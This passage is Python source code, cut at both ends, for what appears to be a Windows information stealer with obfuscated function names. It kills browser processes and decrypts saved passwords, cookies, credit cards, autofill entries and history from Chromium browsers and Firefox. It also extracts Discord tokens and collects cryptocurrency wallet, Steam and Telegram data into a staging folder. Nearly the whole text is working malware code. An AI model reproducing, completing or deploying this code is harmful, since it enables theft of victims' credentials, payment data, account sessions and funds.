    os.makedirs(saveToDir, exist_ok=True)
    with open(saveToDir+'\\Discord_info.txt', 'w', errors='ignore', encoding='utf-8') as f:
        f.write(f"{output}\n")
        discordinfo=True

def r3F0rM47(listt):
    e = re.findall(r"(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))
    

def Wr173F0rF113(data, name):
    with open(name, 'a', errors='ignore', encoding='utf-8') as f:
            if data != '':
                f.write(f"{data}\n")

def G3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                T0K3Ns += token
                                UP104D70K3N(token, path)



def is_file_locked(filepath):
    """ Check if a file is currently being used by another process """
    try:
        with open(filepath, 'r+'):
            return False
    except IOError:
        return True


def kill_browser_processes():
    """Kill common browser processes if running."""
    browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'safari.exe', 'opera.exe', 'iexplore.exe', 'vivaldi.exe', 'brave.exe', 'yandex.exe']
    
    for proc in psutil.process_iter(['pid', 'name']):
        if any(browser.lower() in proc.info['name'].lower() for browser in browsers):
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass


def SQ17H1N6(pathC, tempfold, cmd, retries=5, delay=1):
    try:
        # Check if source file exists
        if not os.path.exists(pathC):
            return None
        if is_file_locked(pathC):
            kill_browser_processes()  
            time.sleep(1) 
        os.makedirs(os.path.dirname(tempfold), exist_ok=True)
        shutil.copy2(pathC, tempfold)
        attempt = 0
        while attempt < retries:
            try:
                conn = sqlite3.connect(tempfold)
                conn.text_factory = lambda b: b.decode(errors='ignore')
                cursor = conn.cursor()
                cursor.execute(cmd)
                data = cursor.fetchall()
                conn.close()
                os.remove(tempfold)  # Clean up
                return data
            except sqlite3.Error as e:
                attempt += 1

                time.sleep(delay)
            except RuntimeError as e:
                #print(f"File error: {e}")
                return None
        raise RuntimeError(f"Could not access SQLite database after {retries} attempts.")
    
    except Exception as e:
        return None



stolen_data=[]   
netscape_cookies=[]
def G37P455W(path,pat, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = TempFolder + "/cs"  + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".db"
        
        name = pat.split('.')[0]
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)
        
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM logins")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
      
        for i in data:
            origin_url, action_url, signon_realm, user = i[0], i[1], str(i[7]), i[3]
            password = decrypt(master_key, i[5])
            P455w.append(f"Origin URL: {origin_url}\nAction URL: {action_url}\nSingon_realm: {signon_realm}\nUsername: {user}\nPassword: {password}")
            P455WC0UNt+=1       
            Wr173F0rF113(f"Origin URL: {origin_url}\nAction URL: {action_url}\nSingon_realm: {signon_realm}\nUsername: {user}\nPassword: {password}", os.path.join(saveToDir, 'Passwords.txt'))
        
        
    except Exception as e:
           pass #print(e)

def decrypt(key, password):
        try:
            iv = password[3:15]
            passw = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(passw)[:-16].decode(errors='ignore')
        except:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
def G37C00K13(path,pat, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        name = pat.split('.')[0]
        tempfold = TempFolder + "/cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".db"
        #print(tempfold)
        #print(path+'\n\n'+path)
        
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM cookies")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key =CryptUnprotectData(master_key[5:])
        #print(data)
        
        for i in data:
            host_key, name, path, expires = i[1], i[3], i[6], i[7]
            value = decrypt(master_key, i[5])
            secure = 'TRUE' if i[8] == 1 else 'FALSE'
            httponly = 'TRUE' if i[9] == 1 else 'FALSE'
            C00K13s.append(f"{host_key}\t{secure}\t{path}\t{httponly}\t{expires}\t{name}\t{value}")
            C00K1C0UNt+=1
            Wr173F0rF113(f"{host_key}\t{secure}\t{path}\t{httponly}\t{expires}\t{name}\t{value}", os.path.join(saveToDir, 'Cookies.txt'))
    except Exception as e:
           pass

def G37CC5(path, pat,arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = TempFolder + "/cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".db"
        
        name = pat.split('.')[0]
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
                Wr173F0rF113(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}", os.path.join(saveToDir, 'creditcards.txt'))
    except Exception as e:
           pass

def G374U70F111(path,pat, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold =TempFolder + "/cs" +''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".db"
        
        
        
        name = pat.split('.')[0]
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
                Wr173F0rF113(f"N4M3: {row[0]} | V4LU3: {row[1]}",os.path.join(saveToDir, 'autofill.txt'))
    except Exception as e:
           pass
def G37H1570rY(path,pat, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/History"
        if os.stat(pathC).st_size == 0: return
        tempfold = TempFolder + "/cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".db"
        name = pat.split('.')[0]
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)
        
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
                Wr173F0rF113(row[1], os.path.join(saveToDir, 'history.txt'))
    except Exception as e:
           pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path,pat, arg):
    try:
        global B00KM4rK5, B00KM4rK5C0UNt

        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.stat(pathC).st_size == 0: return
        #print(pathC)
        
        name = pat.split('.')[0]
        saveToDir = os.path.join(TempFolder, 'Credentials', name)
        os.makedirs(saveToDir, exist_ok=True)
        
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for section in data['roots'].values():
                  for bookmark in section.get('children', []):
                   if 'name' in bookmark and 'url' in bookmark:
                    try:
                      
                        B00KM4rK5.append(f"N4M3: {bookmark['name']} | UR1: {bookmark['url']}")
                        B00KM4rK5C0UNt += 1
                        Wr173F0rF113(f"N4M3: {bookmark['name']} | UR1: {bookmark['url']}", os.path.join(saveToDir, 'bookmarks.txt'))
                    except:pass
    except Exception as e:
           pass


SYSTEM = platform.system()
SYS64 = sys.maxsize > 2**32
DEFAULT_ENCODING = "utf-8"
PWStore = list[dict[str, str]]
class NotFoundError(Exception):pass
class Credentials:
    def __init__(self, db):
        self.db = db
        if not os.path.isfile(db):return
    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:pass
    def done(self): pass
class SqliteCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "signons.sqlite")
        super(SqliteCredentials, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()
    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
        self.c.execute( "SELECT hostname, encryptedUsername, encryptedPassword, encType "
            "FROM moz_logins")
        for i in self.c:
            yield i
    def done(self):
        super(SqliteCredentials, self).done()
        self.c.close()
        self.conn.close()
class JsonCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "logins.json")
        super(JsonCredentials, self).__init__(db)
    def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
      if os.path.exists(self.db):
        with open(self.db) as fh:
            data = json.load(fh)
            try:
                logins = data["logins"]
            except Exception:return
            for i in logins:
                try:
                    yield ( i["hostname"],i["encryptedUsername"],i["encryptedPassword"],i["encType"], )
                except KeyError:pass
def find_nss(locations: list[str], nssname: str) -> ct.CDLL:
    fail_errors: list[tuple[str, str]] = []
    OS = ("Windows")
    for loc in locations:
        nsslib = os.path.join(loc, nssname)
        if SYSTEM in OS:
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            if loc:
                if not os.path.isdir(loc):continue
                workdir = os.getcwd()
                os.chdir(loc)
        try:
            nss: ct.CDLL = ct.CDLL(nsslib)
        except OSError as e:
            fail_errors.append((nsslib, str(e)))
        else:return nss
        finally:
            if SYSTEM in OS and loc:
                os.chdir(workdir)
    else:return
def load_libnss():
    locations: list[str] = [os.environ.get("NSS_LIB_PATH", ""),]
    if SYSTEM == "Windows":
        nssname = "nss3.dll"
        if not SYS64:
            locations += ["C:\\Program Files (x86)\\Mozilla Firefox", "C:\\Program Files (x86)\\Firefox Developer Edition", "C:\\Program Files (x86)\\Mozilla Thunderbird","C:\\Program Files (x86)\\Nightly","C:\\Program Files (x86)\\SeaMonkey","C:\\Program Files (x86)\\Waterfox",]
        locations += [os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),os.path.expanduser("~\\AppData\\Local\\Firefox Developer Edition"),os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),os.path.expanduser("~\\AppData\\Local\\Nightly"),os.path.expanduser("~\\AppData\\Local\\SeaMonkey"),os.path.expanduser("~\\AppData\\Local\\Waterfox"), "C:\\Program Files\\Mozilla Firefox","C:\\Program Files\\Firefox Developer Edition","C:\\Program Files\\Mozilla Thunderbird", "C:\\Program Files\\Nightly","C:\\Program Files\\SeaMonkey", "C:\\Program Files\\Waterfox",]
        software = ["firefox", "thunderbird", "waterfox", "seamonkey"]
        for binary in software:
            location: Optional[str] = shutil.which(binary)
            if location is not None:
                nsslocation: str = os.path.join(os.path.dirname(location), nssname)
                locations.append(nsslocation)
    return find_nss(locations, nssname)
class c_char_p_fromstr(ct.c_char_p):
    def from_param(self):
        return self.encode(DEFAULT_ENCODING)
class NSSProxy:
    class SECItem(ct.Structure):
        _fields_ = [("type", ct.c_uint), ("data", ct.c_char_p), ("len", ct.c_uint),   ]
        def decode_data(self):
            _bytes = ct.string_at(self.data, self.len)
            return _bytes.decode(DEFAULT_ENCODING)
    class PK11SlotInfo(ct.Structure):
        """Opaque structure representing a logical PKCS slot"""
    def __init__(self, non_fatal_decryption=False):
        self.libnss = load_libnss()
        self.non_fatal_decryption = non_fatal_decryption
        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
        SECItemPtr = ct.POINTER(self.SECItem)
        self._set_ctypes(ct.c_int, "NSS_Init", c_char_p_fromstr)
        self._set_ctypes(ct.c_int, "NSS_Shutdown")
        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
        self._set_ctypes(ct.c_int, "PK11_NeedLogin", SlotInfoPtr)
        self._set_ctypes(ct.c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p_fromstr )
        self._set_ctypes(ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p)
        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)
        self._set_ctypes(ct.c_int, "PORT_GetError")
        self._set_ctypes(ct.c_char_p, "PR_ErrorToName", ct.c_int)
        self._set_ctypes(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)
    def _set_ctypes(self, restype, name, *argtypes):
        res = getattr(self.libnss, name)
        res.argtypes = argtypes
        res.restype = restype
        if restype == ct.c_char_p:
            def _decode(result, func, *args):
                try:return result.decode(DEFAULT_ENCODING)
                except AttributeError:return result
            res.errcheck = _decode
        setattr(self, "_" + name, res)
    def initialize(self, profile: str):
        profile_path = "sql:" + profile
        err_status: int = self._NSS_Init(profile_path)
        if err_status:return
    def shutdown(self):
        err_status: int = self._NSS_Shutdown()
        if err_status:return
    def authenticate(self, profile, interactive):
        keyslot = self._PK11_GetInternalKeySlot()
        if not keyslot:return
        self._PK11_FreeSlot(keyslot)
    def decrypt(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        err_status: int = self._PK11SDR_Decrypt(inp, out, None)
        try:res = out.decode_data()
        finally:self._SECITEM_ZfreeItem(out, 0)
        return res
class MozillaInteraction:
    def __init__(self, non_fatal_decryption=False):
        self.profile = None
        self.proxy = NSSProxy(non_fatal_decryption)
    def load_profile(self, profile):
        self.profile = profile
        self.proxy.initialize(self.profile)
    def authenticate(self, interactive):
        self.proxy.authenticate(self.profile, interactive)
    def unload_profile(self):
        self.proxy.shutdown()
        
    def decrypt_passwords(self) -> PWStore:
        credentials: Credentials = self.obtain_credentials()
        outputs: PWStore = []
        url: str
        user: str
        passw: str
        enctype: int
        for url, user, passw, enctype in credentials:
            if enctype:
                try:
                    user = self.proxy.decrypt(user)
                    passw = self.proxy.decrypt(passw)
                except (TypeError, ValueError) as e:pass
            output = {"url": url, "user": user, "password": passw}
            outputs.append(output)
        if not outputs:pass
        credentials.done()
        return outputs
        
    def obtain_credentials(self) -> Credentials:
        credentials: Credentials
        try:credentials = JsonCredentials(self.profile)
        except NotFoundError:
            try:credentials = SqliteCredentials(self.profile)
            except NotFoundError:pass
        return credentials
    def output(self):pass

def HumanOutputFormat(ss):
        global P455w, P455WC0UNt
        saveToDir = os.path.join(TempFolder, 'Credentials','Firefox')
        os.makedirs(saveToDir, exist_ok=True)
        for output in ss:
            P455WC0UNt+=1
            
            P455w.append(f"Website:   {output['url']}\n"
                f"Username: '{output['user']}'\n"
                f"Password: '{output['password']}'\n")
                
            Wr173F0rF113(f"Website:   {output['url']}\n"
                f"Username: '{output['user']}'\n"
                f"Password: '{output['password']}'\n",os.path.join(saveToDir, 'Passwords.txt'))
                

def get_sections(profiles):
    sections = {}
    i = 1
    for section in profiles.sections():
        if section.startswith("Profile"):
            sections[str(i)] = profiles.get(section, "Path")
            i += 1
        else:continue
    return sections
def read_profiles(basepath):
    profileini = os.path.join(basepath, "profiles.ini")
    profiles = ConfigParser()
    profiles.read(profileini, encoding=DEFAULT_ENCODING)
    return profiles
def get_profile( basepath: str):
    try:profiles: ConfigParser = read_profiles(basepath)
    except FileNotFoundError:
        if not os.path.isdir(basepath):profiles = basepath
    else:
        sections = get_sections(profiles)
        return sections
def identify_system_locale() -> str:
    encoding: Optional[str] = locale.getpreferredencoding()
    if encoding is None:return
    return encoding

def taskkill(process_name):
    try:
        os.system(f"taskkill /im {process_name} /t /f >nul 2>&1")
    except Exception as e:
        pass  

def extract_firefox_passwords() -> None:
 if SYSTEM == "Windows":
    taskkill("firefox.exe")
    profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    moz = MozillaInteraction(non_fatal_decryption=False)
    basepath = os.path.expanduser(profile_path)
    profil = get_profile(basepath)
    for i,profile in enumerate(profil.values()):
     profile=os.path.join(basepath, profile)
     if os.path.isdir(profile):
        moz.load_profile(profile)
        moz.authenticate(interactive=False)
        outputs = moz.decrypt_passwords()
        HumanOutputFormat(outputs)
        moz.unload_profile()


def extract_firefox_cookies():
    APPDATA = os.getenv('APPDATA')
    global C00K13s, C00K1C0UNt
    firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
    saveToDir = os.path.join(TempFolder, 'Credentials',"Firefox")
    taskkill("firefox.exe")
    if not os.path.exists(firefox_path):return
    for profile in os.listdir(firefox_path):
        try:                       
            if profile.endswith('.default') or profile.endswith('.default-release'):
                profile_path = os.path.join(firefox_path, profile)
                cookies_file = os.path.join(profile_path, "cookies.sqlite")
                if os.path.exists(cookies_file):
                    os.makedirs(saveToDir, exist_ok=True)         
                    copy_path =TempFolder  + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(15)) + ".sqlite"
                    
                    #copy_path = os.path.join(profile_path, "cookies-copy.sqlite")
                    
                    shutil.copy(cookies_file, copy_path)
                    connection = sqlite3.connect(copy_path)
                    cursor = connection.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    cookie_str = ""

                    for row in cursor.fetchall():
                        host, name, value = row
                        C00K1C0UNt+=1
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                        C00K13s.append(cookie_str)
                        Wr173F0rF113(cookie_str,os.path.join(saveToDir, 'Cookies.txt'))
                    cursor.close()
                    connection.close()
                    os.remove(copy_path)
        except Exception as e:
            continue
            
def s74r787Hr34D(func, arg):
   
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)
    
CHROMIUM_SUBPATHS = [

"/Profile 1/",
"/Profile 2/",
"/Profile 3/",
"/Profile 4/",
"/Profile 5/"

]
def G378r0W53r5(br0W53rP47H5):
   try:
    global Browserthread
    ThCokk, Browserthread, filess = [], [], []
    
    for patt in br0W53rP47H5:
        
        a = threading.Thread(target=G37C00K13, args=[patt[0],patt[1] ,patt[4]])
        a.start()
        ThCokk.append(a)

        s74r787Hr34D(G374U70F111,       [patt[0],patt[1] , patt[3]])
        s74r787Hr34D(G37H1570rY,        [patt[0], patt[1] ,patt[3]])
        s74r787Hr34D(G37800KM4rK5,      [patt[0], patt[1] ,patt[3]])
        s74r787Hr34D(G37CC5,            [patt[0],patt[1] , patt[3]])
        s74r787Hr34D(G37P455W,          [patt[0],patt[1] , patt[3]])
        
    for patt in br0W53rP47H5:
       try:        
        for ext in CHROMIUM_SUBPATHS:
            s74r787Hr34D(G374U70F111,       [patt[0],patt[1], ext])
            s74r787Hr34D(G37H1570rY,        [patt[0], patt[1] ,ext])
            s74r787Hr34D(G37800KM4rK5,      [patt[0], patt[1] ,ext])
            s74r787Hr34D(G37CC5,            [patt[0],patt[1] ,ext])
            s74r787Hr34D(G37P455W,          [patt[0],patt[1] ,ext])  

        for extcn in CHROMIUM_SUBPATHS:
            a = threading.Thread(target=G37C00K13, args=[patt[0],patt[1] ,str(patt[4]).replace("/Default/",extcn) ])
            a.start()
            ThCokk.append(a)
            
       except:pass
              
    #join firefox
    thread = threading.Thread(target=extract_firefox_cookies)
    thread.start()
    ThCokk.append(thread)
    thread= threading.Thread(target=extract_firefox_passwords)
    thread.start()
    ThCokk.append(thread)
    
    for thread in ThCokk: thread.join()
    if TrU57(C00K13s) == True: __import__('sys').exit(0)

    for thread in Browserthread: thread.join()
    #vi aita dekho cookies 
    # ai khane thika nicer part kaita dio
    return
   except:pass
def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global T0K3Ns
                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if CH3CK70K3N(tokenDecoded):
                            if not tokenDecoded in T0K3Ns:
                                T0K3Ns += tokenDecoded
                                UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for walletids in w411375:
        
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)


    for walletids in w411375:
       try:      
        for patt in paths1:
           for index,ppext in enumerate(CHROMIUM_SUBPATHS):
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], str(patt[5]).replace("/Default/",ppext)+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)
       except:pass


    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
  
def Z1P73136r4M(path, arg, procc):
   try:    
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    if os.path.exists(pathC):  
      if len(os.listdir(pathC)) > 0: 
       Z1PTG(name, pathC)    
       O7H3rZ1p.append(name)
    
   except:pass
def Z1P7H1N65(path, arg, procc):
   try:
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    for walllts in w411375:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg
            if os.path.exists(pathC):  
             if len(os.listdir(pathC)) > 0:
               Z1PF01D3r(name, pathC) 
               W411375Z1p.append(name)


    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"
        if os.path.exists(pathC):  
          if len(os.listdir(pathC)) > 0:
             Z1PF01D3r(name, pathC) 
             W411375Z1p.append(name)
    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
                G4M1N6Z1p.append(name)
                Z1PF01D3r(name, pathC) 
        if found == False: return
   except Exception as e:
       pass #print(e)


def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args) 
    a.start()
    THr34D1157.append(a)


def task_kill(*tasks):
    tasks = list(map(lambda x: x.lower(), tasks))
    out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
    for i in out:
        i = i.split('\r\n')[:2]
        try:
            (name, pid) = (i[0].split()[-1], int(i[1].split()[-1]))
            name = name[:-4] if name.endswith('.exe') else name
            if name.lower() in tasks:
                subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
        except Exception:
            pass
            
def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default/",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
       [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
       [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        [r"C:\Program Files (x86)\Steam\config",                                 "steam.exe",               "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]
    task_kill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore','brave','vivaldi','yandex','Telegram')
    


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
